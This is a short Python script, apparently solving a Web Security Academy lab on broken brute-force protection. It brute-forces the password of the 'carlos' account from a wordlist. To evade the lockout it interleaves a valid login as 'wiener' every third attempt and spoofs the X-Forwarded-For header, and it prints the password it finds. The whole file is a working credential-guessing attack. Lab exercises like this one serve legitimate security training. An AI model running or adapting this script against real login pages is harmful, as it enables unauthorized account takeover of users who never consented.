# Lab: Broken brute-force protection, IP block
# author theak

import requests

url = "https://0af2009703d8bdd3804cea2f00e100a6.web-security-academy.net/login"

pass_list = ''
with open("pass.txt" , "r") as f:
	pass_list = f.read()
	f.close()
pass_list = list(pass_list.split('\n'))

counter = 0
i = 0
while True:
	if i>=len(pass_list):
		break;
	if counter ==3:
		data = {
		"username" : "wiener",
		"password" : "peter"
		}
		counter =0
	else:
		data = {
		"username" : "carlos",
		"password" : pass_list[i]
		}
		i +=1
	headers = {
	"Cookie": "session=nInJxkw4Lrs9op87iQlZ6FxfI5hlk8BF",
	"Content-Type": "application/x-www-form-urlencoded",
	"X-Forwarded-For" : f"127.0.{i}.0"
	}
	counter +=1
	r = requests.post(url, data=data, headers=headers)
	if 'wiener' not in r.text and 'Incorrect password' not in r.text and 'You have made too many incorrect login attempts' not in r.text:
		print("password found --> ", pass_list[i-1])
		break

